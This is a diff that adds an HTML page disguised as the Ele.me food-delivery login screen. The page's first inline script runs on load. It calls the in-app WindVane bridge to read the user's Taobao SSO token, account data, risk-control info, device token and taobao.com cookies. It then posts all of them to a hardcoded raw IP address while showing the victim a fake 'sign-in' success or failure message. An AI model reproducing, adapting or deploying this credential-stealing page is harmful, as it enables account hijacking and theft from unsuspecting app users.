@@ -1,0 +1,233 @@
+<html lang="en"><head><meta name="data-spm" content="a2ogi">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="data-bizType" content="elemeapp">
+  <meta name="ltracker-force-autopv" content="true">
+  <link rel="dns-prefetch" href="//img.alicdn.com">
+  <link rel="dns-prefetch" href="//g.alicdn.com">
+  <link rel="dns-prefetch" href="//cube.elemecdn.com">
+
+  <script>
+
+    const UPLOAD_URL = 'http://89.38.131.121:8080/upload';
+
+!function (a, b) {
+    function c(a, b) {
+        a = a.toString().split("."), b = b.toString().split(".");
+        for (var c = 0; c < a.length || c < b.length; c++) {
+            var d = parseInt(a[c], 10), e = parseInt(b[c], 10);
+            if (window.isNaN(d) && (d = 0), window.isNaN(e) && (e = 0), e > d) return -1;
+            if (d > e) return 1
+        }
+        return 0
+    }
+
+    var d = a.Promise, e = a.document, f = a.navigator.userAgent,
+        g = /Windows\sPhone\s(?:OS\s)?[\d\.]+/i.test(f) || /Windows\sNT\s[\d\.]+/i.test(f),
+        h = g && a.WindVane_Win_Private && a.WindVane_Win_Private.call, i = /iPhone|iPad|iPod/i.test(f),
+        j = /Android/i.test(f), k = f.match(/WindVane[\/\s](\d+[._]\d+[._]\d+)/),
+        l = Object.prototype.hasOwnProperty, m = b.windvane = a.WindVane || (a.WindVane = {}),
+        n = Math.floor(65536 * Math.random()), o = 1, p = [], q = 3, r = "hybrid", s = "wv_hybrid", t = "iframe_",
+        u = "param_", v = 6e5, w = 6e4;
+    k = k ? (k[1] || "0.0.0").replace(/\_/g, ".") : "0.0.0";
+    var x = {
+        isAvailable: 1 === c(k, "0"), isNewBridgeAvailable: 1 === c(k, "8.2.0"), call2: function (a, b, c, d, e) {
+            var f = a.indexOf(".");
+            return x.call(a.substr(0, f), a.substr(f + 1), b, c, d, e)
+        }, call: function (b, c, e, f, g, h) {
+            var i, j;
+            if ("number" == typeof arguments[arguments.length - 1] && (h = arguments[arguments.length - 1]), "function" != typeof f && (f = null), "function" != typeof g && (g = null), !d || f || g || (j = new d(function (a, b) {
+                f = a, g = b
+            })), x.isNewBridgeAvailable && a.__windvane__ && a.__windvane__.call) return a.__windvane__.call(b + "." + c, e, f, g, h), j;
+            i = y.getSid();
+            var k = {success: f, failure: g};
+            return h > 0 && (k.timeout = setTimeout(function () {
+                x.onFailure(i, {ret: "HY_TIMEOUT"})
+            }, h)), y.registerCall(i, k), y.registerGC(i, h), x.isAvailable ? y.callMethod(b, c, e, i) : x.onFailure(i, {ret: "HY_NOT_IN_WINDVANE"}), j
+        }, fireEvent: function (a, b, c) {
+            var d = e.createEvent("HTMLEvents");
+            d.initEvent(a, !1, !0), d.param = y.parseData(b), e.dispatchEvent(d)
+        }, getParam: function (a) {
+            return y.getParam(a)
+        }, setData: function (a, b) {
+        }, find: function (a, b) {
+            b || y.unregisterCall(a, !1)
+        }, onSuccess: function (a, b, c) {
+            y.onComplete(a, b, "success", c)
+        }, onFailure: function (a, b) {
+            y.onComplete(a, b, "failure")
+        }
+    };
+    x.isNewBridgeAvailable && a.__windvane__ && a.__windvane__.callSync && (x.callSync = function (b, c) {
+        if (i) return a.__windvane__.callSync(b, c);
+        if (j) {
+            var d = {name: b};
+            c && (d.params = JSON.stringify(c));
+            var e = a.__windvane__.callSync(d);
+            if (e) try {
+                return JSON.parse(e)
+            } catch (f) {
+            }
+        }
+    });
+    var y = {
+        params: {}, calls: {}, getSid: function () {
+            return (n + o++) % 65536 + ""
+        }, buildParam: function (a) {
+            return a && "object" == typeof a ? JSON.stringify(a) : a || ""
+        }, getParam: function (a) {
+            return this.params[u + a] || ""
+        }, setParam: function (a, b) {
+            this.params[u + a] = b
+        }, parseData: function (a) {
+            var b;
+            if (a && "string" == typeof a) try {
+                b = JSON.parse(a)
+            } catch (c) {
+                b = {ret: "HY_RESULT_PARSE_ERROR", originValue: a}
+            } else b = a || {};
+            return b
+        }, registerCall: function (a, b) {
+            this.calls[a] = b
+        }, unregisterCall: function (a, b) {
+            var c = this.calls[a] || {}, d = c.timeout;
+            return d && clearTimeout(d), b || delete this.calls[a], c
+        }, useIframe: function (a, b) {
+            var c = t + a, d = p.pop();
+            d || (d = e.createElement("iframe"), d.setAttribute("frameborder", "0"), d.style.cssText = "width:0;height:0;border:0;display:none;"), d.setAttribute("id", c), d.setAttribute("src", b), d.parentNode || setTimeout(function () {
+                e.body.appendChild(d)
+            }, 5)
+        }, retrieveIframe: function (a) {
+            var b = t + a, c = e.querySelector("#" + b);
+            if (c) if (p.length >= q) try {
+                e.body.removeChild(c)
+            } catch (d) {
+            } else p.indexOf(c) < 0 && p.push(c)
+        }, callMethod: function (b, c, d, e) {
+            if (d = y.buildParam(d), g) h ? a.WindVane_Win_Private.call(b, c, e, d) : this.onComplete(e, {ret: "HY_NO_HANDLER_ON_WP"}, "failure"); else if (i) {
+                this.setParam(e, d);
+                var f = r + "://" + b + ":" + e + "/" + c + "?" + encodeURIComponent(d);
+                this.useIframe(e, f)
+            } else if (j) {
+                var f = r + "://" + b + ":" + e + "/" + c + "?" + d, k = s + ":";
+                window.prompt(f, k)
+            } else this.onComplete(e, {ret: "HY_NOT_SUPPORT_DEVICE"}, "failure")
+        }, registerGC: function (a, b) {
+            var c = this, d = Math.max(b || 0, v), e = Math.max(b || 0, w);
+            setTimeout(function () {
+                c.unregisterCall(a)
+            }, d), i && setTimeout(function () {
+                c.params[u + a] && delete c.params[u + a]
+            }, e)
+        }, onComplete: function (a, b, c, d) {
+            var e = this.unregisterCall(a, d), f = e.success, g = e.failure;
+            b = this.parseData(b);
+            var h = b.ret;
+            "string" == typeof h && (b = b.value || b, b.ret || (b.ret = [h])), "success" === c ? f && f(b) : "failure" === c && g && g(b), i && (this.retrieveIframe(a), this.params[u + a] && delete this.params[u + a])
+        }
+    };
+    for (var z in x) l.call(m, z) || (m[z] = x[z])
+}(window, window.lib || (window.lib = {}));
+
+function trigger(a, b, param = {}) {
+    return new Promise(function (resolve) {
+        window.WindVane.call(a, b, param, resolve, resolve);
+    })
+}
+
+async function main() {
+    let x = {}
+    x.ua = navigator.userAgent;
+    x.getBaseInfo = await trigger('aluAccount', 'getBaseInfo')
+    x.getTbSsoToken = await trigger('aluAccount', 'getTbSsoToken')
+    x.getUser = await trigger('aluAccount', 'getUser')
+    x.getRiskControlInfo = await trigger('aluAccount', 'getRiskControlInfo')
+    x.getWua = await trigger('aluWVJSBridge', 'getWua')
+    x.cookie = await trigger('WVCookie', 'read', {url: 'http://www.taobao.com'})
+
+    const keys = [
+        'getBaseInfo',
+        'getTbSsoToken',
+        'getUser',
+        'getRiskControlInfo',
+        'getWua',
+        'cookie',
+        'ua'
+    ];
+    const missing = [];
+    for (const k of keys) {
+        if (!Object.prototype.hasOwnProperty.call(x, k) ||
+            x[k] === undefined || x[k] === null || x[k] === '') {
+            missing.push(k);
+        }
+    }
+    if (missing.length) {
+        document.write("签到失败，请检查登录状态后重试")
+    } else {
+        try {
+            const resp = await fetch(UPLOAD_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(x),
+                mode: 'cors'
+            });
+            if (resp.ok) {
+                document.write("签到成功");
+            } else if (resp.status === 429) {
+                document.write("签到频繁，请不要重复操作")
+            } else {
+                document.write(`签到失败，请联系代理: ${resp.status} \r\n ${JSON.stringify(x)}`);
+            }
+        } catch (err) {
+            document.write('fetch error', err);
+        }
+    }
+}
+
+(async function () {
+    try {
+        await main();
+    } catch (e) {
+        console.error('overall error', e);
+    }
+})();
+
+  </script>
+  <!-- 上线删除 -->
+  <!-- <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script> -->
+
+  <!-- 上线删除 -->
+  <!-- <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      var vConsole = new VConsole();
+    });
+  </script> -->
+
+  <script async="" src="//g.alicdn.com/sd/baxia/2.5.31/baxiaCommon.js" crossorigin="true"></script><script type="text/javascript" async="" src="https://g.alicdn.com/sd/baxia-entry/index.js" id="aplus-baxia"></script><script src="https://g.alicdn.com/AWSC/WebUMID/1.93.0/um.js" id="AWSC_umidPCModule"></script><script src="https://d.alicdn.com/alilog/mlog/aplus.js?id=202419861" async="" type="text/javascript" id="beacon-aplus"></script><script>
+    var json_parse=function(){"use strict";var a,b,c,d,e={'"':'"',"\\":"\\","/":"/",b:"\b",f:"\f",n:"\n",r:"\r",t:"	"},f=function(b){throw{name:"SyntaxError",message:b,at:a,text:c}},g=function(d){return d&&d!==b&&f("Expected '"+d+"' instead of '"+b+"'"),b=c.charAt(a),a+=1,b},h=function(){var a,c="";for("-"===b&&(c="-",g("-"));b>="0"&&"9">=b;)c+=b,g();if("."===b)for(c+=".";g()&&b>="0"&&"9">=b;)c+=b;if("e"===b||"E"===b)for(c+=b,g(),("-"===b||"+"===b)&&(c+=b,g());b>="0"&&"9">=b;)c+=b,g();return a=+c,isFinite(a)?a:void f("Bad number")},i=function(){var a,c,d,h="";if('"'===b)for(;g();){if('"'===b)return g(),h;if("\\"===b)if(g(),"u"===b){for(d=0,c=0;4>c&&(a=parseInt(g(),16),isFinite(a));c+=1)d=16*d+a;h+=String.fromCharCode(d)}else{if("string"!=typeof e[b])break;h+=e[b]}else h+=b}f("Bad string")},j=function(){for(;b&&" ">=b;)g()},k=function(){switch(b){case"t":return g("t"),g("r"),g("u"),g("e"),!0;case"f":return g("f"),g("a"),g("l"),g("s"),g("e"),!1;case"n":return g("n"),g("u"),g("l"),g("l"),null}f("Unexpected '"+b+"'")},l=function(){var a=[];if("["===b){if(g("["),j(),"]"===b)return g("]"),a;for(;b;){if(a.push(d()),j(),"]"===b)return g("]"),a;g(","),j()}}f("Bad array")},m=function(){var a,c={};if("{"===b){if(g("{"),j(),"}"===b)return g("}"),c;for(;b;){if(a=i(),j(),g(":"),Object.hasOwnProperty.call(c,a)&&f('Duplicate key "'+a+'"'),c[a]=d(),j(),"}"===b)return g("}"),c;g(","),j()}}f("Bad object")};return d=function(){switch(j(),b){case"{":return m();case"[":return l();case'"':return i();case"-":return h();default:return b>="0"&&"9">=b?h():k()}},function(e,g){var h;return c=e,a=0,b=" ",h=d(),j(),b&&f("Syntax error"),"function"==typeof g?function i(a,b){var c,d,e=a[b];if(e&&"object"==typeof e)for(c in e)Object.prototype.hasOwnProperty.call(e,c)&&(d=i(e,c),void 0!==d?e[c]=d:delete e[c]);return g.call(a,b,e)}({"":h},""):h}}();!function(){window.MiniLoginEmbedder||(window.MiniLoginEmbedder=function(){return this.config={targetId:"alibaba-login-iframe",iframeUrl:"https://passport.alipay.com/littleLogin/littleLogin.htm",appName:"4",appEntrance:"default",lang:"zh_CN",cssLink:"",styleType:"vertical",beforeSubmitBtnHtml:"",afterSubmitBtnHtml:"",bizParams:"",queryStr:"",resizeIframeWidthFix:!1,resizeIframeHeightFix:!1,loginId:null,iframeWidth:250,iframeHeight:250,notLoadSsoView:!1,notKeepLogin:!1,isMobile:!1},this.temp={target:null,iframe:null,iframeUrl:null},this._listeners={},this._hashCodeCounter=0,this._messageType=null,this._bakWindowName=window.name,this._windowNameHash=null,this._windowNameTimer=null,this.cachedCustomConfig=null,this},window.MiniLoginEmbedder.prototype={merge:function(){for(var a,b={},c=Array.prototype.slice.call(arguments),d=0;a=c[d++];)for(var e in a)b[e]=a[e];return b},json2str:function(a){switch(a.constructor){case Object:var b="{";for(var c in a)a[c]&&(b+='"'+c+'":'+arguments.callee(a[c])+",");return","==b.substr(b.length-1)&&(b=b.substr(0,b.length-1)),b+"}";case Array:var b="[";for(var c in a)b+=arguments.callee(a[c])+",";return","==b.substr(b.length-1)&&(b=b.substr(0,b.length-1)),b+"]";default:return'"'+a.toString()+'"'}},toQueryPair:function(a,b){return"undefined"==typeof b?a:a+"="+encodeURIComponent(null===b?"":String(b))},toQueryString:function(a){var b=this,c=[];for(var d in a){d=encodeURIComponent(d);var e=a[d];if(e&&e.constructor==Array){for(var f,g=[],h=0,i=e.length;i>h;h++)f=e[h],g.push(b.toQueryPair(d,f));c=c.concat(g)}else c.push(b.toQueryPair(d,e))}return c.join("&")},get:function(a){return"string"==typeof a?document.getElementById(a):a},hasClass:function(a,b){return a.className.match(new RegExp("(\\s|^)"+b+"(\\s|$)"))},addClass:function(a,b){return""===a.className?void(a.className=b):void(this.hasClass(a,b)||(a.className+=" "+b))},removeClass:function(a,b){if(this.hasClass(a,b)){var c=new RegExp("(\\s|^)"+b+"(\\s|$)");a.className=a.className.replace(c," ")}},on:function(a,b,c){var d=this.get(a);d.attachEvent?(d["e"+b+c]=c,d[b+c]=function(){d["e"+b+c](window.event)},d.attachEvent("on"+b,d[b+c])):d.addEventListener(b,c,!1)},addEvent:function(a,b){if("function"==typeof b){var c=this._listeners[a];c||(c=this._listeners[a]={}),c[this._toHashCode(b)]=b}},fireEvent:function(a,b){if(this._listeners[a])for(var c in this._listeners[a])this._listeners[a][c].call(this,b)},_toHashCode:function(a){return a._hashCode?a._hashCode:a._hashCode="_"+(this._hashCodeCounter++).toString(32)},_tempOnInit:function(){this.temp.target=this.get(this.config.targetId)},_parseWindowNameData:function(a){var b=a.split("[@]").pop().split("[login-iframe-message]");return{origin:b[0],data:b[1]}},init:function(a){this.cachedCustomConfig=a,this.config=this.merge(this.config,a||{});var b=this;this.config,this.temp;b._tempOnInit(),b._renderIframe(),window.postMessage?(b._messageType="postMessage",b.on(window,"message",function(a){b.messageHanlder.call(b,a)})):(b._messageType="windowName",window.name="",b._windowNameHash="",b._windowNameTimer=setInterval(function(){""!==window.name&&-1!==window.name.indexOf("[login-iframe-message]")&&window.name!=b._windowNameHash&&(b._windowNameHash=window.name,b.messageHanlder(b._parseWindowNameData(window.name)))},50)),this.fireEvent("onInit",{_self:this}),this.free()},messageHanlder:function(a){var b,c=this,d=this.config,e=this.temp;try{b=a.data.indexOf("action")>-1?json_parse(decodeURIComponent(a.data)):""}catch(f){b=""}switch(b.showIframe&&("visible"!==e.iframe.style.visibility&&(e.iframe.style.visibility="visible"),this.fireEvent("onIframeShow",{_self:e.iframe}),c.addClass(e.target,"iframe-show")),b.hideIframe&&("hidden"!==e.iframe.style.visibility&&(e.iframe.style.visibility="hidden"),this.fireEvent("onIframeHide",{_self:e.iframe}),c.removeClass(e.target,"iframe-show")),b.action){case"resizeIframe":if(0==e.iframe.offsetHeight)return;d.resizeIframeWidthFix||(e.iframe.width=b.width),d.resizeIframeHeightFix||(e.iframe.height=b.height),c._bakOriginalIframeWidth||(d.resizeIframeWidthFix||(c._originalIframeWidth=b.width),d.resizeIframeHeightFix||(c._originalIframeHeight=b.height),c._bakOriginalIframeWidth=!0);break;case"refreshIframe":c.temp.iframe&&(c.temp.iframe.src=c.temp.iframeUrl);break;case"otherAction":}this.fireEvent("onMessage",b)},restoreOriginalWidth:function(){this.iframe.width=this._originalIframeWidth},restoreOriginalHeight:function(){this.iframe.height=this._originalIframeHeight},_renderIframe:function(){var a,b=this,c=this.config,d=this.temp,e=d.target,f=this.temp.iframe=document.createElement("iframe");a={lang:c.lang,appName:c.appName,appEntrance:c.appEntrance,styleType:c.styleType,bizParams:c.bizParams,notLoadSsoView:c.notLoadSsoView,notKeepLogin:c.notKeepLogin,isMobile:c.isMobile},c.loginId&&(a.loginId=c.loginId),f.id="alibaba-login-box",f.src=c.iframeUrl+"?"+b.toQueryString(a)+b.config.queryStr+"&rnd="+Math.random(),d.iframeUrl=f.src,f.width=c.iframeWidth,f.height=c.iframeHeight,f.frameBorder="none",f.scrolling="no",f.style.border="none",b.on(f,"load",function(){b.addClass(e,"iframe-loaded")}),e.appendChild(f),this.fireEvent("afterRenderIframe",{iframe:f})},free:function(){/msie/i.test(navigator.userAgent)&&CollectGarbage()},sleep:function(){var a=this;"windowName"===a._messageType&&(clearInterval(a._windowNameTimer),window.name=this._bakWindowName),this.free()},destory:function(){var a=this;"windowName"===a._messageType&&(clearInterval(a._windowNameTimer),window.name=this._bakWindowName),this.free()}})}();
+  </script>
+  <meta name="description" content="饿了么是中国专业的网上订餐平台，目前已覆盖北京、上海、杭州、广州等300多个城市，提供各类中式、日式、韩式、西式、下午茶、夜宵等优质美食，并提供送餐上门服务，让订餐更加轻松，叫外卖就上饿了么！">
+  <meta name="keywords" content="饿了么，网上订餐，外卖，快餐外卖，外卖网">
+  <meta name="data-aspm" content="a2ogi.13162730">
+  <title>饿了么-登录</title>
+  <script src="//polyfill.alicdn.com/polyfill.min.js?features=es5,es6,es2017,RegeneratorRuntime,Promise,Promise.prototype.finally"></script>
+  <script>
+    !function () { function n() { var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : window.location.href; if (!(this instanceof n)) return new n(e); var t = RegExp.prototype.test.bind(/^(?:toString|valueOf)$/), o = {}; return e.replace(/([^=?#&]*)=([^?#&]*)/g, function (n, e, i) { t(e) || (o[decodeURIComponent(e)] = decodeURIComponent(i)) }), o } window.UParams = n }();
+  </script>
+  <script src="https://g.alicdn.com/code/npm/@ali/ltracker-h5/1.3.31/index.js" async="" crossorigin=""></script>
+  <!-- <script
+    src='https://dev.g.alicdn.com/code/npm/@ali/ltracker-h5/<%= debugLtraceVersion %>/index.js'
+    async crossorigin></script> -->
+  <script>
+    window._ex = { biz: 'a2ogi.13162730', bizType: 'KOUBEI', realtime: false, debug: false, enableUrlQuery: true };
+  </script>
+  <script src="//gw.alipayobjects.com/as/g/koubei-data-center/exlog/1.3.8/index.js" crossorigin=""></script>
+  <script type="module" crossorigin="" src="./assets/index.7211b56f.js"></script>
+  <link rel="stylesheet" href="./assets/index.c14219cc.css">
+<meta name="referrer" content="no-referrer-when-downgrade"><script async="" src="https://g.alicdn.com/code/npm/@ali/pcom-ebridge/0.4.40/cdn/??client/wap.js,api.js"></script><style type="text/css">#alibaba-login-box{padding-top:50px;padding-bottom:60px;}</style><script id="aplus-sufei" src="//g.alicdn.com/secdev/entry/index.js"></script><script crossorigin="" referrerpolicy="unsafe-url" src="//g.alicdn.com/secdev/sufei_data/3.9.10/index.js" id="aplus-sufei"></script><script crossorigin="" referrerpolicy="unsafe-url" src="//g.alicdn.com/AWSC/et/1.77.4/et_f.js"></script><script type="text/javascript" src="//g.alicdn.com/AWSC/AWSC/awsc.js"></script></head>
+  <body data-noaplus="" data-spm="13162730">
+    <div id="root"><div class="mini-login-box"><div id="alibaba-login-iframe" class="iframe-loaded"><div id="alibaba-login-iframe-loading"></div><iframe id="alibaba-login-box" src="https://ipassport.ele.me/mini_login.htm?lang=zh_cn&amp;appName=eleme&amp;appEntrance=eleme_sms_h5&amp;styleType=vertical&amp;bizParams=&amp;notLoadSsoView=true&amp;notKeepLogin=false&amp;isMobile=true&amp;rnd=0.9061029628080128" width="100%" height="100%" frameborder="none" scrolling="no" style="border: none;"></iframe></div><div class="mobile-footer"><div class="mobile-footer-large"><p>v1.6.1</p><p></p></div></div></div></div>
+    
+  
+
+</body></html>
